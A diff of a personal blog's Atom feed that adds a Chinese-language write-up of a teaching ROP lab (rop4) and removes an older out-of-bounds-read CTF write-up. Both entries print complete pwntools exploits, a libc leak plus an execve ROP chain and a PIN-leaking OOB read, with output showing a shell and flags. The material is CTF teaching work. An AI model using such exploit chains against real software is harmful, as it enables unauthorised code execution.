@@ -6,7 +6,7 @@
   <link href="https://kazma.tw/atom.xml" rel="self"/>
   
   <link href="https://kazma.tw/"/>
-  <updated>2024-08-05T11:18:26.040Z</updated>
+  <updated>2024-08-05T18:14:31.836Z</updated>
   <id>https://kazma.tw/</id>
   
   <author>
@@ -15,6 +15,36 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>LYS Rop lab_rop4 Writeup</title>
+    <link href="https://kazma.tw/2024/08/05/LYS-Rop-lab-rop4-Writeup/"/>
+    <id>https://kazma.tw/2024/08/05/LYS-Rop-lab-rop4-Writeup/</id>
+    <published>2024-08-05T15:52:01.060Z</published>
+    <updated>2024-08-05T18:14:31.836Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="lab-rop4"><a href="#lab-rop4" class="headerlink" title="lab_rop4"></a>lab_rop4</h1><p>這次藉著到 AIS3 當助教的緣故順便跟 <a class="link"   href="https://curious-lucifer.netlify.app/" >Curious <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 一起把 LYS ROP 系列課程的 lab 整理到了部落格，也方便給學員參考。<br>那因為是一系列的 lab，所以接下來只會主要講跟上個版本的差異</p><h2 id="Diff-Exploitation"><a href="#Diff-Exploitation" class="headerlink" title="Diff &amp; Exploitation"></a>Diff &amp; Exploitation</h2><p>這次是用更新的 gcc 編譯的，因為沒有 csu_init 所以 binary 沒有 pop_rdi 可以用了，但我們原本其實只是要用他來指定 printf 要 leak 某個 libc_adress，那 printf 在設定 rdi 時其實是用 <code>mov rdi, rax</code>，所以換句話說，我們只要控好 rax 就可以成功 leak，那這可以透過 <code>deregister_tm_clones</code> 來讓 rax 設定成一個特定的值，剛好因為 <code>setvbuf</code> 的關係所以 <code>deregister_tm_clones</code> 這邊會執行 <code>mov eax, stdout@GLIBC_2.2.5</code>，就可以 leak 出 stdout_got 算出 libc_base，那最後會用 <code>execve(&#39;/bin/sh&#39;, 0, 0)</code> 而不是像之前一樣 <code>system(&#39;/bin/sh&#39;)</code> 是因為 system 的毛比較多，exploit 跑到 system 裡會爛掉，改成 <code>execve</code> 就可以順利 RCE 了。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">l = ELF(<span class="string">&quot;../libc.so.6&quot;</span>)</span><br><span class="line">r = process(<span class="string">&quot;./rop4&quot;</span>)</span><br><span class="line"></span><br><span class="line">dtmclones = <span class="number">0x4010D0</span></span><br><span class="line">ret = <span class="number">0x40101A</span></span><br><span class="line">name = <span class="number">0x404060</span></span><br><span class="line">mov_rdi_rax = <span class="number">0x401240</span></span><br><span class="line"></span><br><span class="line">p = flat(<span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span>, name + <span class="number">0x10</span>, ret, dtmclones, mov_rdi_rax)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;? &quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;: &quot;</span>, p)</span><br><span class="line">r.sendline(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">l.address = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x21A780</span></span><br><span class="line">success(<span class="string">&quot;libc_base -&gt; %s&quot;</span> % <span class="built_in">hex</span>(l.address))</span><br><span class="line"></span><br><span class="line">pop_rdi = l.address + <span class="number">0x2A3E5</span></span><br><span class="line">pop_rsi = l.address + <span class="number">0x2BE51</span></span><br><span class="line">pop_rax = l.address + <span class="number">0x45EB0</span></span><br><span class="line">pop_rdx = l.address + <span class="number">0x796A2</span></span><br><span class="line">syscall = l.address + <span class="number">0x29DB4</span></span><br><span class="line"></span><br><span class="line">p2 = flat(</span><br><span class="line">    <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span>,</span><br><span class="line">    pop_rax,</span><br><span class="line">    <span class="number">0x3B</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="built_in">next</span>(l.search(<span class="string">&quot;/bin/sh\0&quot;</span>)),</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    pop_rdx,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    syscall,</span><br><span class="line">)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;: &quot;</span>, p2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/lys_rop/libc.so.6&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to 35.229.243.81 on port 10104: Done</span><br><span class="line">[+] libc_base -&gt; 0x7f9d93996000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">cat</span> /home/chal/flag.txt</span><br><span class="line">FLAG&#123;323c28b8ccb8caf18383bc9529212924&#125;$</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;lab-rop4&quot;&gt;&lt;a href=&quot;#lab-rop4&quot; class=&quot;headerlink&quot; title=&quot;lab_rop4&quot;&gt;&lt;/a&gt;lab_rop4&lt;/h1&gt;&lt;p&gt;這次藉著到 AIS3 當助教的緣故順便跟 &lt;a class=&quot;link&quot;   href=&quot;h</summary>
+      
+    
+    
+    
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
+    
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
+    
+    <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
+    
+    <category term="dtmclones" scheme="https://kazma.tw/tags/dtmclones/"/>
+    
+  </entry>
   
   <entry>
     <title>LYS Rop lab_rop3 Writeup</title>
@@ -36,11 +66,11 @@
     
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
-    <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
     
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
     
     <category term="migration" scheme="https://kazma.tw/tags/migration/"/>
     
@@ -68,11 +98,11 @@
     
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
-    <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
     
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
     
     <category term="migration" scheme="https://kazma.tw/tags/migration/"/>
     
@@ -100,9 +130,9 @@
     
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
-    <category term="shellcode" scheme="https://kazma.tw/tags/shellcode/"/>
-    
     <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
+    
+    <category term="shellcode" scheme="https://kazma.tw/tags/shellcode/"/>
     
   </entry>
   
@@ -126,9 +156,9 @@
     
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
-    <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
     
     <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
     
@@ -294,11 +324,11 @@
     
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
+    <category term="oob" scheme="https://kazma.tw/tags/oob/"/>
+    
     <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
     
     <category term="ret2libc" scheme="https://kazma.tw/tags/ret2libc/"/>
-    
-    <category term="oob" scheme="https://kazma.tw/tags/oob/"/>
     
   </entry>
   
@@ -376,13 +406,13 @@
     
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
-    <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
-    <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
+    <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
     
     <category term="oob" scheme="https://kazma.tw/tags/oob/"/>
+    
+    <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
     
   </entry>
   
@@ -489,9 +519,9 @@
     
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
-    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
     
     <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
     
@@ -517,9 +547,9 @@
     
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
-    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
     
     <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
     
@@ -545,37 +575,9 @@
     
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
-    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
-    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Pwnctf oob1 Writeup</title>
-    <link href="https://kazma.tw/2024/01/17/Pwnctf-oob1-Writeup/"/>
-    <id>https://kazma.tw/2024/01/17/Pwnctf-oob1-Writeup/</id>
-    <published>2024-01-16T17:04:53.000Z</published>
-    <updated>2024-01-16T18:09:04.766Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="oob1"><a href="#oob1" class="headerlink" title="oob1"></a>oob1</h1><p>執行後可以觀察到這題的情境是一個登入系統，首先會讓我們輸入 User ID，然後輸入密碼，再來會顯示我們嘗試登入的使用者名稱，最後輸出結果，如下所示：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./oob1</span><br><span class="line">User ID: 3</span><br><span class="line">PIN: 1324</span><br><span class="line">Logging to [guest] ... Failed</span><br><span class="line">Incorrect PIN code!</span><br><span class="line"></span><br><span class="line">User ID: 0</span><br><span class="line">PIN: 0000</span><br><span class="line">Logging to [admin] ... Failed</span><br><span class="line">Incorrect PIN code!</span><br><span class="line"></span><br><span class="line">User ID: 5</span><br><span class="line">non-existed ID!</span><br></pre></td></tr></table></figure></div><p>這題的關鍵是在讀取 User ID 時沒有做檢查，又他會顯示我們正在嘗試登入的使用者，因此可以透過 oob read 去讀取到 admin 的一開始設定的隨機密碼：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/oob1_key.png"                      alt="key"                ></p><p>從上面可以看到 obj.user 的位置在 0x6010c0，那我們接下來就找 admin 的密碼放在哪個位置：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/oob1_pass.png"                      alt="pass"                ></p><p>從上面可以找到 obj.pincode 在 0x6010a0，跟 obj.user 差 0x20，又原本的功能是要取其他 username 所以 rax 會左移三個 bits，也就是乘以 8，故 User ID 輸入 -4 可以 oob read 我們想要的東西，然後 information leak 完之後再把結果吃回來整理一下，登入 admin 即可走到 win func，exploit 如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./oob1&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;-4&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;1234&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;[&quot;</span>)</span><br><span class="line">pin = u32(r.recvuntil(<span class="string">&quot;]&quot;</span>)[:-<span class="number">1</span>][:<span class="number">4</span>].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pin: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(pin))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(pin))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;cat f*&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>Result:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./oob1&#x27;</span>: pid 2841934</span><br><span class="line">pin: 151386595</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> Logging to [admin] ... Ok!</span><br><span class="line"></span><br><span class="line">BreakALLCTF&#123;CPuPeMrhVrWWx2XueaIr&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;oob1&quot;&gt;&lt;a href=&quot;#oob1&quot; class=&quot;headerlink&quot; title=&quot;oob1&quot;&gt;&lt;/a&gt;oob1&lt;/h1&gt;&lt;p&gt;執行後可以觀察到這題的情境是一個登入系統，首先會讓我們輸入 User ID，然後輸入密碼，再來會顯示我們嘗試登入的使用者名稱</summary>
-      
-    
-    
-    
-    
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
-    
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
     
